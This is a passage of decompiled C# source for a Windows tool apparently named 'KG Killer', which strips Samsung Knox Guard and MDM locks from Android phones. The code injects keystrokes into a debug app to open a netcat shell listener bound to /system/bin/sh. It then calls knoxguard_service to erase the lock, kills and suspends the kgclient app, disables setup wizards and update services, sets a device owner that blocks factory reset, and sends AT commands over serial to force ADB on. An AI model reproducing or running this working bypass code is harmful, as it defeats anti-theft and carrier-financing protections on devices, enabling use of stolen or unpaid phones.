						this.Logs("Bypassing KG :", Color.FloralWhite);
						foreach (string command in adbCommands)
						{
							this.adbclients.ExecuteRemoteCommand(command);
							Thread.Sleep(200);
							command = null;
						}
						string[] array = null;
						Task.Delay(100);
						List<string> list3 = new List<string>
						{
							"cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND ignore", "cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND ignore", "pm suspend com.samsung.android.kgclient", "cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND ignore", "am set-inactive com.samsung.android.kgclient true", "am kill com.samsung.android.kgclient", "am crash com.samsung.android.kgclient", "am stop-app com.samsung.android.kgclient", "cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND deny", "cmd appops set com.samsung.android.kgclient RUN_ANY_IN_BACKGROUND deny",
							"cmd appops set com.samsung.android.kgclient WAKE_LOCK deny", "cmd appops set com.samsung.android.kgclient POST_NOTIFICATION deny", "cmd appops set com.samsung.android.kgclient ACCESS_RESTRICTED_SETTINGS deny", "cmd appops set com.samsung.android.kgclient SCHEDULE_EXACT_ALARM deny", "cmd appops set com.samsung.android.kgclient GreenTOOTH_CONNECT deny", "cmd appops set com.samsung.android.kgclient SYSTEM_EXEMPT_FROM_DISMISSIBLE_NOTIFICATIONS deny", "pm install-existing --restrict-permissions --user 0 com.android.systemui", "pm uninstall --user 0 com.google.android.setupwizard", "reboot"
						};
						this.progressBar1.Value = 80;
						Process process3 = ShellController.CreateShellProcess();
						foreach (string command2 in list3)
						{
							string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
							output = this.CustomizeOutput(output);
							output = null;
							command2 = null;
						}
						List<string>.Enumerator enumerator = default(List<string>.Enumerator);
						ShellController.CloseShellProcess(process3);
						this.Logs(" Ok\n", Color.Green);
						this.progressBar1.Value = 90;
						string text = await this.<button2_Click>g__GetWaitForDevicesResultAsync|46_0();
						string result = text + "\n";
						text = null;
						this.Logs(" KG STATUS  : ", Color.FloralWhite);
						this.Logs(props["knox.kg.state"] + " \n", Color.Green);
						this.progressBar1.Value = 100;
						this.Logs("KG Removed SucessFully KG Killer\n\r", Color.Gold);
						this.progressBar1.Value = 0;
						props = null;
						adbCommands = null;
						list3 = null;
						process3 = null;
					}
					else
					{
						this.Logs(" Device not found", Color.Red);
					}
				}
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Error: " + ex2.Message);
			}
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void button7_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x00009EE0 File Offset: 0x000080E0
		private void button3_Click(object sender, EventArgs e)
		{
			Form2 form = new Form2();
			form.Show();
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x00009EFC File Offset: 0x000080FC
		public bool CheckRunAdb()
		{
			bool flag;
			try
			{
				new TcpClient("127.0.0.1", 5037);
				flag = true;
			}
			catch (SocketException)
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x00009F34 File Offset: 0x00008134
		public bool CariAdbDevice()
		{
			bool flag;
			try
			{
				if (this.adbclients != null)
				{
					AdbDevice[] devices = this.adbclients.GetDevices();
					if (devices != null && devices.Length != 0)
					{
						AdbDevice[] array = devices;
						for (int i = 0; i < array.Length; i++)
						{
							AdbDevice device = array[i];
							this.Adb_Devices.Invoke(new Action(delegate
							{
								this.Adb_Devices.Text = string.Concat(new string[]
								{
									"ADB  [ SN : ",
									device.SerialNumber.ToUpper(),
									" - Model : ",
									device.Model,
									"]"
								});
							}));
						}
						this.SnAdb = devices[0].SerialNumber.ToString();
						flag = true;
					}
					else
					{
						this.Logs("No ADB Devices Found.", Color.Red);
						flag = false;
					}
				}
				else
				{
					this.Logs("ADB client is not initialized.", Color.Red);
					flag = false;
				}
			}
			catch (NullReferenceException ex)
			{
				this.Logs("NullReferenceException: " + ex.Message, Color.Red);
				flag = false;
			}
			catch (Exception ex2)
			{
				this.Logs("Error: " + ex2.Message, Color.Red);
				flag = false;
			}
			return flag;
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x0000A050 File Offset: 0x00008250
		private async Task WaitForDevices()
		{
			this.Logs("Waiting For Devices...\n", Color.Green);
			await Adb.AdbCommandAsync(" wait-for-device");
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x0000A094 File Offset: 0x00008294
		private async Task PushApkAsync(string apkFileName, string destination)
		{
			await this.ExecuteAdbCommandAsync("push " + apkFileName + " " + destination);
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x0000A0E8 File Offset: 0x000082E8
		private async Task<string> ExecuteAdbCommandAsync(string command)
		{
			string text3;
			try
			{
				ProcessStartInfo processInfo = new ProcessStartInfo
				{
					FileName = "data\\adb.exe",
					Arguments = command,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using (Process process = new Process
				{
					StartInfo = processInfo
				})
				{
					TaskCompletionSource<object> processExited = new TaskCompletionSource<object>();
					process.EnableRaisingEvents = true;
					process.Exited += delegate(object sender, EventArgs args)
					{
						processExited.SetResult(null);
					};
					process.Start();
					string text = await process.StandardOutput.ReadToEndAsync();
					string output = text;
					text = null;
					await processExited.Task;
					if (process.ExitCode != 0)
					{
						TaskAwaiter<string> taskAwaiter = process.StandardError.ReadToEndAsync().GetAwaiter();
						if (!taskAwaiter.IsCompleted)
						{
							await taskAwaiter;
							TaskAwaiter<string> taskAwaiter2;
							taskAwaiter = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter<string>);
						}
						string text2 = taskAwaiter.GetResult();
						string errorMessage = text2;
						text2 = null;
						throw new Exception("Error executing adb command: " + errorMessage);
					}
					text3 = output;
				}
			}
			catch
			{
				text3 = string.Empty;
			}
			return text3;
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x0000A134 File Offset: 0x00008334
		private async void button1_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Do You Want To Continue", "KG Killer", MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				this.ResultTxt.Clear();
				MessageBox.Show("If You Fail Then Try Again Same Process", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				try
				{
					this.Logs("\nChecking ADB Server..", Color.FloralWhite);
					await Task.Delay(100);
					if (!this.CheckRunAdb())
					{
						TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
						if (!taskAwaiter.IsCompleted)
						{
							await taskAwaiter;
							TaskAwaiter taskAwaiter2;
							taskAwaiter = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter.GetResult();
					}
					else
					{
						this.Logs(" Running\n", Color.Green);
						TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
						TaskAwaiter taskAwaiter2;
						if (!taskAwaiter3.IsCompleted)
						{
							await taskAwaiter3;
							taskAwaiter3 = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter3.GetResult();
						this.Logs("Searching devices..\n", Color.FloralWhite);
						await Task.Delay(10);
						this.progressBar1.Value = 10;
						if (this.CariAdbDevice())
						{
							TaskAwaiter taskAwaiter4 = Task.Delay(10).GetAwaiter();
							if (!taskAwaiter4.IsCompleted)
							{
								await taskAwaiter4;
								taskAwaiter4 = taskAwaiter2;
								taskAwaiter2 = default(TaskAwaiter);
							}
							taskAwaiter4.GetResult();
							this.adbclients.SetDevice(this.SnAdb);
							Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
							try
							{
								this.Logs("Model  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.model"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Brand  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.brand"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("CPU  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.board"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Version  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.incremental"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Build date  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.date"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Security patch  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.security_patch"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Android version  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.release"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Android SDK  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.sdk"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("KG STATUS➾ ", Color.FloralWhite);
								this.Logs(props["knox.kg.state"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.progressBar1.Value = 20;
							}
							catch (Exception ex)
							{
								Console.WriteLine("Error: " + ex.Message);
							}
							this.Logs("Writing Data File ", Color.FloralWhite);
							this.Logs(" OK\n", Color.FloralWhite);
							await Task.Delay(100);
							await Task.WhenAll(new Task[]
							{
								Task.Run(delegate
								{
									this.InstallApk("2.apk", "install -r");
								}),
								Task.Delay(700),
								Task.Run(delegate
								{
									this.InstallApk("3.apk", "install -r");
								}),
								Task.Delay(1200),
								Task.Run(delegate
								{
									this.InstallApk("1.apk", "install -i PrePackageInstaller");
								}),
								Task.Delay(500),
								Task.Run(delegate
								{
									this.InstallApk("1.apk", "install -d -i com.sec.android.preloadinstaller");
								}),
								Task.Delay(500)
							});
							this.progressBar1.Value = 40;
							await this.PushApkAsync("1.apk", "/data/local/tmp/zero.apk");
							await Task.Delay(3000);
							this.Logs("Writing Data File To System ", Color.FloralWhite);
							string[] adbCommands = new string[]
							{
								"am start -n com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.MainActivity", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent 66", "input text 'nc -s 127.0.0.1 -p 2222 -L /system/bin/sh'",
								"input keyevent KEYCODE_TAB", "input keyevent 66"
							};
							this.Logs(" OK\n", Color.Green);
							this.progressBar1.Value = 50;
							this.Logs("Erase KG ", Color.FloralWhite);
							foreach (string command in adbCommands)
							{
								this.adbclients.ExecuteRemoteCommand(command);
								Thread.Sleep(200);
								command = null;
							}
							string[] array = null;
							List<string> list3 = new List<string>
							{
								"nc 127.0.0.1 2222", "service call knoxguard_service 37", "service call knoxguard_service 44 s16 'null'", "service call knoxguard_service 43 s16 'null'", "service call knoxguard_service 42 s16 'null'", "service call knoxguard_service 41 s16 'null'", "service call knoxguard_service 41 s16 null", "service call knoxguard_service 40 s16 'null'", "service call knoxguard_service 40 s16 null", "service call knoxguard_service 40",
								"reboot"
							};
							this.progressBar1.Value = 80;
							Process process3 = ShellController.CreateShellProcess();
							foreach (string command2 in list3)
							{
								string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
								output = this.CustomizeOutput(output);
								output = null;
								command2 = null;
							}
							List<string>.Enumerator enumerator = default(List<string>.Enumerator);
							ShellController.CloseShellProcess(process3);
							this.Logs(" Ok\n", Color.Green);
							this.progressBar1.Value = 90;
							string text = await this.<button1_Click>g__GetWaitForDevicesResultAsync|54_4();
							string result = text + "\n";
							text = null;
							this.Logs(" KG STATUS  : ", Color.FloralWhite);
							this.Logs(props["knox.kg.state"] + " \n", Color.Green);
							this.progressBar1.Value = 100;
							this.Logs("KG Removed SucessFully KG Killer\n\r", Color.Green);
							this.progressBar1.Value = 0;
							props = null;
							adbCommands = null;
							list3 = null;
							process3 = null;
						}
						else
						{
							this.Logs(" Device not found", Color.Red);
						}
					}
				}
				catch (Exception ex2)
				{
					Console.WriteLine("Error: " + ex2.Message);
				}
			}
			else
			{
				this.Logs("Operation Cancelled BY User\r\n", Color.Red);
			}
		}

		// Token: 0x060000EA RID: 234 RVA: 0x0000A17C File Offset: 0x0000837C
		private string CustomizeOutput(string originalOutput)
		{
			return originalOutput.ToUpper();
		}

		// Token: 0x060000EB RID: 235 RVA: 0x0000A194 File Offset: 0x00008394
		private async void button14_Click(object sender, EventArgs e)
		{
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (!this.CheckRunAdb())
			{
				TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
			}
			else
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter3.IsCompleted)
				{
					await taskAwaiter3;
					TaskAwaiter taskAwaiter2;
					taskAwaiter3 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter3.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("\nWAIT", Color.FloralWhite);
						this.progressBar1.Value = 0;
						Adb.AdbCommand("shell pm disable-user --user 0 com.wssyncmldm");
						Adb.AdbCommand("adb shell pm disable-user -–user 0 com.google.android.factoryota");
						Thread.Sleep(1500);
						this.progressBar1.Value = 50;
						this.ResultTxt.SelectionColor = Color.Green;
						this.ResultTxt.AppendText(" ➾\nHide Successfully ");
						this.progressBar1.Value = 100;
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
				}
			}
		}

		// Token: 0x060000EC RID: 236 RVA: 0x0000A1DC File Offset: 0x000083DC
		private async void button16_Click(object sender, EventArgs e)
		{
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (!this.CheckRunAdb())
			{
				TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
			}
			else
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter3.IsCompleted)
				{
					await taskAwaiter3;
					TaskAwaiter taskAwaiter2;
					taskAwaiter3 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter3.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Wait a while", Color.FloralWhite);
						Adb.AdbCommand("shell pm enable --user 0 com.wssyncmldm");
						Adb.AdbCommand("adb shell pm enable-user -–user 0 com.google.android.factoryota");
						Thread.Sleep(1500);
						this.ResultTxt.SelectionColor = Color.Green;
						this.ResultTxt.AppendText(" ➾ Successfully Enabled \n");
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
				}
			}
		}

		// Token: 0x060000ED RID: 237 RVA: 0x0000A224 File Offset: 0x00008424
		private async void button17_Click(object sender, EventArgs e)
		{
			this.Logs("\n\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (this.CheckRunAdb())
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Model  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.product.model"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("KG STATUS➾ ", Color.FloralWhite);
						this.Logs(props["knox.kg.state"], Color.Red);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.incremental"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Build date  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.date"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Security patch  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.security_patch"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.release"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
					props = null;
				}
			}
			else
			{
				await this.WaitForDevices();
			}
		}

		// Token: 0x060000EE RID: 238 RVA: 0x0000A26C File Offset: 0x0000846C
		private async void button15_Click(object sender, EventArgs e)
		{
			this.Logs("\n\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (!this.CheckRunAdb())
			{
				TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
			}
			else
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter3.IsCompleted)
				{
					await taskAwaiter3;
					TaskAwaiter taskAwaiter2;
					taskAwaiter3 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter3.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						MessageBox.Show("This Is Universal Method");
						this.Logs("\n Wait a While\n", Color.Gold);
						this.progressBar1.Value = 30;
						await Task.WhenAll(new Task[]
						{
							Task.Run(delegate
							{
								this.InstallApk("kgkiller.apk", "install");
							}),
							Task.Delay(100)
						});
						Thread.Sleep(2000);
						this.Logs("\n Disabling...", Color.FloralWhite);
						this.progressBar1.Value = 50;
						Adb.AdbCommand("shell dpm set-device-owner \"com.mdmfixtool.mdmfixtool/.DeviceAdmin\"");
						Thread.Sleep(500);
						Adb.AdbCommand("shell am start --user 0 -n com.mdmfixtool.mdmfixtool/.DisableFactoryReset");
						Thread.Sleep(1500);
						this.Logs("Ok\n", Color.Green);
						this.progressBar1.Value = 100;
						this.Logs("\n Successful Disabled", Color.Gold);
						this.progressBar1.Value = 0;
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
				}
			}
		}

		// Token: 0x060000EF RID: 239 RVA: 0x0000A2B4 File Offset: 0x000084B4
		private async void InstallApk(string apkFileName, string installingCommand)
		{
			try
			{
				this.adbclients.SetDevice(this.SnAdb);
				string rootDirectory = AppDomain.CurrentDomain.BaseDirectory;
				string adbFolderPath = Path.Combine(rootDirectory, "data");
				string apkPath = Path.Combine(adbFolderPath, apkFileName);
				string adbCommand = installingCommand + " \"" + apkPath + "\"";
				string installResult = Adb.Shell(adbCommand);
				if (installResult.ToLower().Contains("success"))
				{
					this.Logs("Deploying Data: ", Color.FloralWhite);
					this.Logs("Success\n", Color.Green);
				}
				else
				{
					this.Logs("Deploying Data: ", Color.FloralWhite);
					this.Logs("Failed\n", Color.Red);
				}
				rootDirectory = null;
				adbFolderPath = null;
				apkPath = null;
				adbCommand = null;
				installResult = null;
			}
			catch (Exception ex2)
			{
				Exception ex = ex2;
				if (ex.ToString().Contains("device unauthorized"))
				{
					this.Logs("Device: ", Color.FloralWhite);
					this.Logs("Unauthorized\n", Color.Red);
				}
				else if (!ex.ToString().Contains("device offline"))
				{
					this.Logs("Error: " + ex.Message, Color.FloralWhite);
				}
				else
				{
					this.Logs("Device: ", Color.FloralWhite);
					this.Logs("Offline\n", Color.Red);
				}
			}
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x0000A2FC File Offset: 0x000084FC
		private async void button5_Click(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			if (MessageBox.Show("Go to emergency dialer enter *#0*#, click ok when done", "KG Killer", MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				KGKiller.ComPort comPort = this.Adb_Devices.SelectedItem as KGKiller.ComPort;
				if (comPort != null)
				{
					this.Logs(" OPERATION Enabling ADB....\r\n", Color.Green);
					KGKiller._serialPort = new SerialPort
					{
						PortName = comPort.Name
					};
					try
					{
						KGKiller._serialPort.BaudRate = 115200;
						KGKiller._serialPort.Open();
						if (!KGKiller._serialPort.IsOpen)
						{
							this.Logs("Failed to open port, check the port and try again \r\n", Color.Red);
						}
						else
						{
							this.ResultTxt.AppendText("\r\nSending command data to Device...");
							this.ResultTxt.AppendText("OK");
							KGKiller._serialPort.Write("AT+KSTRINGB=0,3\r\n");
							this.progressBar1.Value = 20;
							Thread.Sleep(1000);
							this.ResultTxt.AppendText("\r\nSending Request to KG Killer ...");
							this.ResultTxt.AppendText("Accepted!");
							this.progressBar1.Value = 40;
							KGKiller._serialPort.Write("AT+DUMPCTRL=1,0\r\n");
							Thread.Sleep(1000);
							this.ResultTxt.AppendText("\r\nRequest KG Killer For Unlock Key...");
							this.ResultTxt.AppendText("Accepted!");
							this.progressBar1.Value = 60;
							KGKiller._serialPort.Write("AT+DEBUGLVC=0,5\r\n");
							Thread.Sleep(1000);
							this.ResultTxt.AppendText("\r\nEnabling Adb ...");
							KGKiller._serialPort.Write("AT+SWATD=0\r\n");
							Thread.Sleep(1000);
							KGKiller._serialPort.Write("AT+ACTIVATE=0,0,0\r\n");
							this.progressBar1.Value = 70;
							Thread.Sleep(1000);
							KGKiller._serialPort.Write("AT+SWATD=1\r\n");
							this.progressBar1.Value = 80;
							Thread.Sleep(1000);
							KGKiller._serialPort.Write("AT+PARALLEL=2,0,00000;AT+DEBUGLVC=0,5\r\n");
							this.progressBar1.Value = 90;
							Thread.Sleep(1000);
							KGKiller._serialPort.Write("AT+PARALLEL=2,0,00000\r\n");
							this.progressBar1.Value = 100;
							Thread.Sleep(1000);
							this.progressBar1.Value = 0;
							string response = KGKiller._serialPort.ReadTo("#OK#");
							this.ProcessResponse(response);
							response = null;
						}
					}
					catch
					{
					}
					finally
					{
						if (KGKiller._serialPort.IsOpen)
						{
							KGKiller._serialPort.Close();
						}
					}
				}
				comPort = null;
			}
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void tabPage6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void button8_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x0000A344 File Offset: 0x00008544
		private void KGKiller_FormClosing(object sender, FormClosingEventArgs e)
		{
			KillCommand.ProcessKill();
			Application.Exit();
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x00009B9C File Offset: 0x00007D9C
		private void pictureBox3_Click(object sender, EventArgs e)
		{
			Process.Start("devmgmt.msc");
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x0000A35C File Offset: 0x0000855C
		private void pictureBox4_Click(object sender, EventArgs e)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "https://t.me/+T2mPs1x8T6hhNmU9",
				UseShellExecute = true
			});
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void tabPage2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x0000A388 File Offset: 0x00008588
		private void button19_Click(object sender, EventArgs e)
		{
			string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
			string text = Path.Combine(baseDirectory, "data");
			string text2 = Path.Combine(text, "odin.exe");
			try
			{
				Process.Start(text2);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error: " + ex.Message);
			}
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x0000A3EC File Offset: 0x000085EC
		private void button21_Click(object sender, EventArgs e)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "https://samfw.com/",
				UseShellExecute = true
			});
		}

		// Token: 0x060000FA RID: 250 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void button12_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000FB RID: 251 RVA: 0x0000A418 File Offset: 0x00008618
		private void button13_Click(object sender, EventArgs e)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "https://kgkiller.com/download/driver.exe",
				UseShellExecute = true
			});
		}

		// Token: 0x060000FC RID: 252 RVA: 0x0000A444 File Offset: 0x00008644
		private async void button4_Click(object sender, EventArgs e)
		{
			A14_qr f2 = new A14_qr();
			f2.Show();
		}

		// Token: 0x060000FD RID: 253 RVA: 0x0000A48C File Offset: 0x0000868C
		private async void button6_Click(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			MessageBox.Show("If You Fail Then Try Again Same Process", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			string usernamee = Form3.usrname;
			this.Logs("\nUser :", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation:", Color.FloralWhite);
			this.Logs("IT Admin Hyper OS (Android 15) \n", Color.Gold);
			this.Logs("\n\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (this.CheckRunAdb())
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Model  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.product.model"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Brand➾ ", Color.FloralWhite);
						this.Logs(props["ro.product.brand"], Color.Red);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.incremental"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Build date  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.date"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Security patch  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.security_patch"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.release"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
					Adb.AdbCommand("shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1");
					Adb.AdbCommand("shell pm disable-user --user 0 com.sec.android.app.setupwizard");
					Adb.AdbCommand("shell pm disable-user --user 0 com.sec.android.app.setupwizardlegalprovider");
					Adb.AdbCommand("shell pm disable-user --user 0 com.sec.android.app.SecSetupWizard");
					Adb.AdbCommand("shell pm disable-user --user 0 com.hihonor.ouc");
					Adb.AdbCommand("shell pm uninstall --user 0 com.hihonor.ouc");
					Adb.AdbCommand("shell pm disable-user --user 0 om.dti.attmx");
					Adb.AdbCommand("shell pm uninstall --user 0 com.dti.attmx");
					Adb.AdbCommand("shell pm disable-user --user 0 com.android.hotwordenrollment.okgoogle");
					Adb.AdbCommand("shell pm uninstall --user 0 com.android.hotwordenrollment.okgoogle");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.youtube");
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.youtube");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.apps.youtube.music");
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.apps.youtube.music");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.apps.maps");
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.apps.maps");
					this.Logs("Removing MDM :", Color.FloralWhite);
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.apps.tachyon");
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.apps.tachyon");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.apps.photos");
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.apps.photos");
